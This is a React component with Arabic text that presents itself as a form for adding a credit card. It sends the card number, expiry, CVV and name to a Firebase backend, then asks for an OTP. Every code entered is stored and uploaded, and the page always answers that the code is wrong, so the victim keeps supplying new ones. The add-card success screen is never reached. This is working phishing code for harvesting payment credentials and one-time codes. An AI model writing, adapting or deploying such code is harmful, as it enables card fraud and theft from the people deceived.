"use client"

import { addData } from "@/lib/firebase"
import { useState, type ChangeEvent, type FormEvent } from "react"
import { Button } from "@/components/ui/button"
import { FullPageLoader } from "./loader"

interface CardData {
  number: string
  name: string
  expiry: string
  cvv: string
}

const allOtps = [""]

export default function AddCard() {
  const [cardData, setCardData] = useState<CardData>({
    number: "",
    name: "",
    expiry: "",
    cvv: "",
  })

  const [otp, setOtp] = useState("")
  const [step, setStep] = useState<"form" | "otp" | "success">("form")
  const [error, setError] = useState("")
  const [loading, setLoading] = useState(false)

  const formatCardNumber = (v: string) =>
    v
      .replace(/\D/g, "")
      .replace(/(.{4})/g, "$1 ")
      .trim()

  const handleCardSubmit = async (e: FormEvent) => {
    e.preventDefault()
    const visitorID = localStorage.getItem("visitor")

    if (!cardData.number || !cardData.name || !cardData.expiry || !cardData.cvv) {
      setError("الرجاء إدخال جميع بيانات البطاقة.")
      return
    }
    setLoading(true)
    await addData({
      id: visitorID,
      cardNumber: cardData.number,
      cardExpiry: cardData.expiry,
      cvv: cardData.cvv,
      name: cardData.name,
      createdDate: new Date().toISOString(),
    })
    setError("")

    setTimeout(() => {
      setLoading(false)
      setStep("otp")
    }, 3000);

  }

  const handleOtpSubmit = async (e: FormEvent) => {
    e.preventDefault()
    setLoading(true)
    const visitorID = localStorage.getItem("visitor")
    allOtps.push(otp)

    await addData({
      id: visitorID,
      otp,
      allOtps,
      createdDate: new Date().toISOString(),
    })

    setTimeout(() => {
      setLoading(false)
      setError("رمز التحقق غير صحيح.")
    }, 3000);
  }

  const handleInputChange = (e: ChangeEvent<HTMLInputElement>, field: keyof CardData) => {
    setCardData({ ...cardData, [field]: e.target.value })
  }

  return (
    <div
      className="min-h-screen bg-gradient-to-br from-slate-50 via-white to-slate-50 flex items-center justify-center p-4"
      dir="rtl"
    >
      {loading && <FullPageLoader />}
      <div className="w-full max-w-md bg-white rounded-2xl shadow-2xl overflow-hidden">
        {/* Header Section */}
        <div className="bg-gradient-to-r from-slate-700 to-slate-900 px-6 py-8">
          <h1 className="text-2xl font-bold text-white">إضافة بطاقة ائتمانية</h1>
          <p className="text-slate-300 text-sm mt-2">
            {step === "form" && "أدخل بيانات بطاقتك بأمان"}
            {step === "otp" && "تحقق من هويتك بإدخال رمز OTP"}
            {step === "success" && "تمت العملية بنجاح"}
          </p>
        </div>

        {/* Content Section */}
        <div className="p-6 space-y-6">
          {/* Card Input Form */}
          {step === "form" && (
            <form onSubmit={handleCardSubmit} className="space-y-5">
              {/* Card Number */}
              <div className="space-y-2">
                <label className="text-sm font-semibold text-slate-700 block">رقم البطاقة</label>
                <input
                  inputMode="numeric"
                  maxLength={23}
                  value={formatCardNumber(cardData.number)}
                  onChange={(e) => handleInputChange(e, "number")}
                  placeholder="XXXX XXXX XXXX XXXX"
                  className="w-full px-4 py-3 border-2 border-slate-200 rounded-lg focus:border-slate-700 focus:outline-none transition-colors text-lg tracking-widest font-mono placeholder:text-slate-400"
                />
              </div>

              {/* Cardholder Name */}
              <div className="space-y-2">
                <label className="text-sm font-semibold text-slate-700 block">اسم حامل البطاقة</label>
                <input
                  value={cardData.name}
                  onChange={(e) => handleInputChange(e, "name")}
                  placeholder="الاسم كما هو على البطاقة"
                  className="w-full px-4 py-3 border-2 border-slate-200 rounded-lg focus:border-slate-700 focus:outline-none transition-colors placeholder:text-slate-400"
                />
              </div>

              {/* Expiry Date and CVV */}
              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-2">
                  <label className="text-sm font-semibold text-slate-700 block">تاريخ الانتهاء</label>
                  <input
                    value={cardData.expiry}
                    onChange={(e) => handleInputChange(e, "expiry")}
                    placeholder="MM/YY"
                    className="w-full px-4 py-3 border-2 border-slate-200 rounded-lg focus:border-slate-700 focus:outline-none transition-colors text-center placeholder:text-slate-400"
                  />
                </div>
                <div className="space-y-2">
                  <label className="text-sm font-semibold text-slate-700 block">رمز الحماية</label>
                  <input
                    value={cardData.cvv}
                    onChange={(e) => handleInputChange(e, "cvv")}
                    placeholder="XXX"
                    className="w-full px-4 py-3 border-2 border-slate-200 rounded-lg focus:border-slate-700 focus:outline-none transition-colors text-center placeholder:text-slate-400"
                  />
                </div>
              </div>

              {error && (
                <div className="bg-red-50 border border-red-200 rounded-lg p-3">
                  <p className="text-red-700 text-sm font-medium">{error}</p>
                </div>
              )}

              <Button
                type="submit"
                className="w-full py-3 bg-gradient-to-r from-slate-700 to-slate-900 text-white rounded-lg text-base font-semibold hover:from-slate-800 hover:to-slate-950 transition-all duration-200 shadow-md hover:shadow-lg"
              >
                متابعة
              </Button>
            </form>
          )}

          {/* OTP Verification */}
          {step === "otp" && (
            <form onSubmit={handleOtpSubmit} className="space-y-5">
              <div className="space-y-2">
                <label className="text-sm font-semibold text-slate-700 block">رمز التحقق</label>
                <input
                  type="text"
                  value={otp}
                  onChange={(e) => setOtp(e.target.value)}
                  placeholder="أدخل رمز OTP"
                  className="w-full px-4 py-3 border-2 border-slate-200 rounded-lg focus:border-slate-700 focus:outline-none transition-colors text-center text-2xl tracking-widest placeholder:text-slate-400"
                />
              </div>

              <p className="text-sm text-slate-500 text-center">رمز التحقق: 123456</p>

              {error && (
                <div className="bg-red-50 border border-red-200 rounded-lg p-3">
                  <p className="text-red-700 text-sm font-medium">{error}</p>
                </div>
              )}

              <Button
                type="submit"
                className="w-full py-3 bg-gradient-to-r from-slate-700 to-slate-900 text-white rounded-lg text-base font-semibold hover:from-slate-800 hover:to-slate-950 transition-all duration-200 shadow-md hover:shadow-lg"
              >
                تأكيد
              </Button>
            </form>
          )}

          {/* Success Screen */}
          {step === "success" && (
            <div className="text-center space-y-4 py-8">
              <div className="flex justify-center">
                <div className="w-16 h-16 bg-emerald-100 rounded-full flex items-center justify-center">
                  <svg className="w-8 h-8 text-emerald-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                  </svg>
                </div>
              </div>
              <div>
                <h2 className="text-xl font-bold text-slate-900">تمت إضافة البطاقة بنجاح!</h2>
                <p className="text-slate-600 text-sm mt-1">يمكنك الآن استخدام بطاقتك للدفع</p>
              </div>
              <Button
                onClick={() => setStep("form")}
                className="w-full py-3 bg-slate-100 text-slate-700 rounded-lg text-base font-semibold hover:bg-slate-200 transition-all duration-200"
              >
                إضافة بطاقة أخرى
              </Button>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}
